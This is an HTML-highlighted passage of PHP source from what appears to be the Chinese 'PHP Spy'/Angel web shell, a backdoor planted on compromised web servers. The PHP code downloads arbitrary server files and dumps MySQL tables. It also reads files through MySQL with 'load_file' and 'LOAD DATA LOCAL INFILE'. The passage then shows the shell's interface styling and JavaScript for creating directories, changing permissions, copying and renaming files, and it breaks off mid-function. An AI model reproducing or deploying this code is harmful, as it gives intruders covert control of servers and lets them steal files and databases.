<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'downfile'</span> &amp;&amp; $<span style="color: #eab700;">thefile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!@<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">thefile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fileinfo</span> = <span style="color: #4d4d4c; background-color: #ffffff;">pathinfo(</span>$<span style="color: #eab700;">thefile</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-type: application/x-'</span>.$<span style="color: #eab700;">fileinfo</span>[<span style="color: #3e999f;">'extension'</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eab700;">fileinfo</span>[<span style="color: #3e999f;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-Length: '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">thefile</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">readfile(</span>$<span style="color: #eab700;">thefile</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'backupmysql'</span> &amp;&amp; !$<span style="color: #eab700;">saveasfile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">table</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> =<span style="color: #3e999f;">'Please choose the table'</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>, $<span style="color: #eab700;">dbuser</span>, $<span style="color: #eab700;">dbpass</span>, $<span style="color: #eab700;">dbname</span>, $<span style="color: #eab700;">charset</span>, $<span style="color: #eab700;">dbp</span><span style="color: #eab700; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filename</span> = <span style="color: #4d4d4c; background-color: #ffffff;">basename(</span>$<span style="color: #eab700;">dbname</span>.<span style="color: #3e999f;">'.sql'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-type: application/unknown'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eab700;">filename</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">table</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">k</span> =&gt; $<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">sqldumptable(</span>$<span style="color: #eab700;">v</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">mysql_close(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #718c00;">if</span>($<span style="color: #eab700;">doing</span>==<span style="color: #3e999f;">'mysqldown'</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">dbname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">'Please input dbname'</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>, $<span style="color: #eab700;">dbuser</span>, $<span style="color: #eab700;">dbpass</span>, $<span style="color: #eab700;">dbname</span>, $<span style="color: #eab700;">charset</span>, $<span style="color: #eab700;">dbp</span><span style="color: #eab700; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">mysqldlfile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #eab700;">result</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">addslashes(</span>$<span style="color: #eab700;">mysqldlfile</span>).<span style="color: #3e999f;">"' INTO TA</span><span style="color: #3e999f; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"select content from tmp_angel"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">row</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">result</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">row</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">errmsg</span> = <span style="color: #3e999f;">'Load file failed '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">mysql_error(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fileinfo</span> = <span style="color: #4d4d4c; background-color: #ffffff;">pathinfo(</span>$<span style="color: #eab700;">mysqldlfile</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-type: application/x-'</span>.$<span style="color: #eab700;">fileinfo</span>[<span style="color: #3e999f;">'extension'</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eab700;">fileinfo</span>[<span style="color: #3e999f;">'b</span><span style="color: #3e999f; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">header(</span><span style="color: #3e999f;">"Accept-Length: "</span>.<span style="color: #4d4d4c; background-color: #ffffff;">strlen(</span>$<span style="color: #eab700;">row</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>]));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">row</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;html&gt;</span>
<span style="color: #4271ae;">&lt;head&gt;</span>
<span style="color: #4271ae;">&lt;meta</span> <span style="color: #c82829; font-weight: bold;">http</span>-<span style="color: #c82829; font-weight: bold;">equiv</span>=<span style="color: #3e999f;">"Content-Type"</span> <span style="color: #4271ae;">content=</span><span style="color: #3e999f;">"text/html; charset=gbk"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #4271ae;">&lt;title&gt;</span><span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">action</span>.<span style="color: #3e999f;">' - '</span>.$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'HTTP_HOST'</span>];<span style="color: #8959a8;">?&gt;</span><span style="color: #4271ae;">&lt;/title&gt;</span>
<span style="color: #4271ae;">&lt;style</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"text/css"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #c82829; font-weight: bold;">body</span>,<span style="color: #c82829; font-weight: bold;">td</span>{<span style="color: #c82829; font-weight: bold;">font</span>: <span style="color: #4d4d4c; background-color: #ffffff;">12</span>px <span style="color: #c82829; font-weight: bold;">Arial</span>,<span style="color: #c82829; font-weight: bold;">Tahoma</span>;<span style="color: #c82829; font-weight: bold;">line</span>-<span style="color: #c82829; font-weight: bold;">height</span>: <span style="color: #4d4d4c; background-color: #ffffff;">16</span>px;}
.<span style="color: #c82829; font-weight: bold;">input</span>{<span style="color: #c82829; font-weight: bold;">font</span>:<span style="color: #4d4d4c; background-color: #ffffff;">12</span>px <span style="color: #c82829; font-weight: bold;">Arial</span>,<span style="color: #c82829; font-weight: bold;">Tahoma</span>;<span style="color: #c82829; font-weight: bold;">background</span>:<span style="color: #8e908c; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.<span style="color: #c82829; font-weight: bold;">area</span>{<span style="color: #c82829; font-weight: bold;">font</span>:<span style="color: #4d4d4c; background-color: #ffffff;">12</span>px <span style="color: #3e999f;">'Courier New'</span>, <span style="color: #c82829; font-weight: bold;">Monospace</span>;<span style="color: #c82829; font-weight: bold;">background</span>:<span style="color: #8e908c; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.<span style="color: #c82829; font-weight: bold;">bt</span> {<span style="color: #c82829; font-weight: bold;">border</span>-<span style="color: #c82829; font-weight: bold;">color</span>:<span style="color: #8e908c; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #c82829; font-weight: bold;">a</span> {<span style="color: #c82829; font-weight: bold;">color</span>: <span style="color: #8e908c; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #c82829; font-weight: bold;">a</span>:<span style="color: #c82829; font-weight: bold;">hover</span>{<span style="color: #c82829; font-weight: bold;">color</span>: <span style="color: #8e908c; font-style: italic;">#f00;text-decoration:none;}</span>
.<span style="color: #c82829; font-weight: bold;">alt1</span> <span style="color: #c82829; font-weight: bold;">td</span>{<span style="color: #c82829; font-weight: bold;">border</span>-<span style="color: #c82829; font-weight: bold;">top</span>:<span style="color: #4d4d4c; background-color: #ffffff;">1</span>px <span style="color: #c82829; font-weight: bold;">solid</span> <span style="color: #8e908c; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #c82829; font-weight: bold;">alt2</span> <span style="color: #c82829; font-weight: bold;">td</span>{<span style="color: #c82829; font-weight: bold;">border</span>-<span style="color: #c82829; font-weight: bold;">top</span>:<span style="color: #4d4d4c; background-color: #ffffff;">1</span>px <span style="color: #c82829; font-weight: bold;">solid</span> <span style="color: #8e908c; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #c82829; font-weight: bold;">focus</span> <span style="color: #c82829; font-weight: bold;">td</span>{<span style="color: #c82829; font-weight: bold;">border</span>-<span style="color: #c82829; font-weight: bold;">top</span>:<span style="color: #4d4d4c; background-color: #ffffff;">1</span>px <span style="color: #c82829; font-weight: bold;">solid</span> <span style="color: #8e908c; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #c82829; font-weight: bold;">head</span> <span style="color: #c82829; font-weight: bold;">td</span>{<span style="color: #c82829; font-weight: bold;">border</span>-<span style="color: #c82829; font-weight: bold;">top</span>:<span style="color: #4d4d4c; background-color: #ffffff;">1</span>px <span style="color: #c82829; font-weight: bold;">solid</span> <span style="color: #8e908c; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #c82829; font-weight: bold;">head</span> <span style="color: #c82829; font-weight: bold;">td</span> <span style="color: #c82829; font-weight: bold;">span</span>{<span style="color: #c82829; font-weight: bold;">font</span>-<span style="color: #c82829; font-weight: bold;">weight</span>:<span style="color: #c82829; font-weight: bold;">normal</span>;}
.<span style="color: #c82829; font-weight: bold;">infolist</span> {<span style="color: #c82829; font-weight: bold;">padding</span>:<span style="color: #4d4d4c; background-color: #ffffff;">10</span>px;<span style="color: #c82829; font-weight: bold;">margin</span>:<span style="color: #4d4d4c; background-color: #ffffff;">10</span>px <span style="color: #4d4d4c; background-color: #ffffff;">0</span> <span style="color: #4d4d4c; background-color: #ffffff;">20</span>px <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">background</span>:<span style="color: #8e908c; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;"> #ddd;}</span>
<span style="color: #c82829; font-weight: bold;">form</span>{<span style="color: #c82829; font-weight: bold;">margin</span>:<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">padding</span>:<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;}
<span style="color: #c82829; font-weight: bold;">h2</span>{<span style="color: #c82829; font-weight: bold;">margin</span>:<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">padding</span>:<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">height</span>:<span style="color: #4d4d4c; background-color: #ffffff;">24</span>px;<span style="color: #c82829; font-weight: bold;">line</span>-<span style="color: #c82829; font-weight: bold;">height</span>:<span style="color: #4d4d4c; background-color: #ffffff;">24</span>px;<span style="color: #c82829; font-weight: bold;">font</span>-<span style="color: #c82829; font-weight: bold;">size</span>:<span style="color: #4d4d4c; background-color: #ffffff;">14</span>px;<span style="color: #c82829; font-weight: bold;">color</span>:<span style="color: #8e908c; font-style: italic;">#5B686F;</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">}</span>
<span style="color: #c82829; font-weight: bold;">ul</span>.<span style="color: #c82829; font-weight: bold;">info</span> <span style="color: #c82829; font-weight: bold;">li</span>{<span style="color: #c82829; font-weight: bold;">margin</span>:<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">color</span>:<span style="color: #8e908c; font-style: italic;">#444;line-height:24px;height:24px;}</span>
<span style="color: #c82829; font-weight: bold;">u</span>{<span style="color: #c82829; font-weight: bold;">text</span>-<span style="color: #c82829; font-weight: bold;">decoration</span>: <span style="color: #c82829; font-weight: bold;">none</span>;<span style="color: #c82829; font-weight: bold;">color</span>:<span style="color: #8e908c; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #8e908c; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.<span style="color: #c82829; font-weight: bold;">drives</span>{<span style="color: #c82829; font-weight: bold;">padding</span>:<span style="color: #4d4d4c; background-color: #ffffff;">5</span>px;}
.<span style="color: #c82829; font-weight: bold;">drives</span> <span style="color: #c82829; font-weight: bold;">span</span> {<span style="color: #c82829; font-weight: bold;">margin</span>:<span style="color: #c82829; font-weight: bold;">auto</span> <span style="color: #4d4d4c; background-color: #ffffff;">7</span>px;}
<span style="color: #4271ae;">&lt;/style&gt;</span>
<span style="color: #4271ae;">&lt;script</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"text/javascript"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">CheckAll</span>(<span style="color: #c82829; font-weight: bold;">form</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">for</span>(<span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">i</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>;<span style="color: #c82829; font-weight: bold;">i</span><span style="color: #4271ae;">&lt;form</span>.<span style="color: #c82829; font-weight: bold;">elements</span>.<span style="color: #c82829; font-weight: bold;">length</span>;<span style="color: #c82829; font-weight: bold;">i</span>++) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">e</span> = <span style="color: #c82829; font-weight: bold;">form</span>.<span style="color: #4d4d4c; background-color: #ffffff;">elements[</span><span style="color: #c82829; font-weight: bold;">i</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">e</span>.<span style="color: #c82829; font-weight: bold;">name</span> != <span style="color: #3e999f;">'chkall'</span>)
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">e</span>.<span style="color: #c82829; font-weight: bold;">checked</span> = <span style="color: #c82829; font-weight: bold;">form</span>.<span style="color: #c82829; font-weight: bold;">chkall</span>.<span style="color: #c82829; font-weight: bold;">checked</span>;
<span style="background-color: #d6d6d6;"> </span>   }
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">$</span>(<span style="color: #c82829; font-weight: bold;">id</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #c82829; font-weight: bold;">document</span>.<span style="color: #4d4d4c; background-color: #ffffff;">getElementById(</span><span style="color: #c82829; font-weight: bold;">id</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">createdir</span>(){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">newdirname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">newdirname</span> = <span style="color: #4d4d4c; background-color: #ffffff;">prompt(</span><span style="color: #3e999f;">'Please input the directory name:'</span>, <span style="color: #3e999f;">''</span>  );
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">newdirname</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'createdir'</span>).<span style="color: #c82829; font-weight: bold;">newdirname</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">newdirname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'createdir'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">fileperm</span>(<span style="color: #c82829; font-weight: bold;">pfile</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">newperm</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">newperm</span> = <span style="color: #4d4d4c; background-color: #ffffff;">prompt(</span><span style="color: #3e999f;">'Current file:'</span>+<span style="color: #c82829; font-weight: bold;">pfile</span>+<span style="color: #3e999f;">'\nPlease input new attribute:'</span>, <span style="color: #3e999f;">''</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">newperm</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileperm'</span>).<span style="color: #c82829; font-weight: bold;">newperm</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">newperm</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileperm'</span>).<span style="color: #c82829; font-weight: bold;">pfile</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">pfile</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileperm'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">copyfile</span>(<span style="color: #c82829; font-weight: bold;">sname</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">tofile</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">tofile</span> = <span style="color: #4d4d4c; background-color: #ffffff;">prompt(</span><span style="color: #3e999f;">'Original file:'</span>+<span style="color: #c82829; font-weight: bold;">sname</span>+<span style="color: #3e999f;">'\nPlease input object file (fullpath</span><span style="color: #3e999f; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">tofile</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'copyfile'</span>).<span style="color: #c82829; font-weight: bold;">tofile</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">tofile</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'copyfile'</span>).<span style="color: #c82829; font-weight: bold;">sname</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">sname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'copyfile'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">rename</span>(<span style="color: #c82829; font-weight: bold;">oldname</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">newfilename</span>;
